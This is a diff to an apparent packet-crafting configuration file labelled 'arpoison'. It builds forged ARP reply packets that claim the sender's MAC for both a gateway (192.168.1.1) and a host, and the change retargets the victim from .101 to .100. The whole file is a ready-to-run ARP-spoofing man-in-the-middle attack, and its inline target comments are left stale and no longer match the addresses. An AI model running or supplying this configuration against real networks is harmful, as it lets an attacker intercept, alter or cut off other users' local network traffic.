@@ -1,6 +1,6 @@
 [
     {
-        "_comment": "arpoison to 192.168.1.1 and 192.168.1.101",
+        "_comment": "arpoison to 192.168.1.1 and 192.168.1.100",
         "Socket-type": "Data-link",
         "Option": {
             "Device": "en0",
@@ -13,7 +13,7 @@
                 "Send Packet": [
                     {
                         "Ethernet": {
-                            "Destination MAC Address": "lookup_mac_address(192.168.1.101)",
+                            "Destination MAC Address": "lookup_mac_address(192.168.1.1)",
                             "Source MAC Address": "myself",
                             "Type": "ETHERTYPE_ARP"
                         }
@@ -22,10 +22,10 @@
                         "ARP": {
                             "Operation": "ARPOP_REPLY", /*Operation is reply*/
                             "Sender Hardware Address": "myself",
-                            "Sender Protocol Address": "192.168.1.1",
+                            "Sender Protocol Address": "192.168.1.100",
                             /*Target 1 is 192.168.1.101*/
-                            "Target Hardware Address": "lookup_mac_address(192.168.1.101)",
-                            "Target Protocol Address": "192.168.1.101"
+                            "Target Hardware Address": "lookup_mac_address(192.168.1.1)",
+                            "Target Protocol Address": "192.168.1.1"
                         }
                     },
                     {
@@ -40,7 +40,7 @@
                 "Send Packet": [
                     {
                         "Ethernet": {
-                            "Destination MAC Address": "lookup_mac_address(192.168.1.1)",
+                            "Destination MAC Address": "lookup_mac_address(192.168.1.100)",
                             "Source MAC Address": "myself",
                             "Type": "ETHERTYPE_ARP"
                         }
@@ -49,10 +49,10 @@
                         "ARP": {
                             "Operation": "ARPOP_REPLY",  /*Operation is reply*/
                             "Sender Hardware Address": "myself",
-                            "Sender Protocol Address": "192.168.1.101",
+                            "Sender Protocol Address": "192.168.1.1",
                             /*Target 2 is 192.168.1.1*/
-                            "Target Hardware Address": "lookup_mac_address(192.168.1.1)",
-                            "Target Protocol Address": "192.168.1.1"
+                            "Target Hardware Address": "lookup_mac_address(192.168.1.100)",
+                            "Target Protocol Address": "192.168.1.100"
                         }
                     }
                 ]
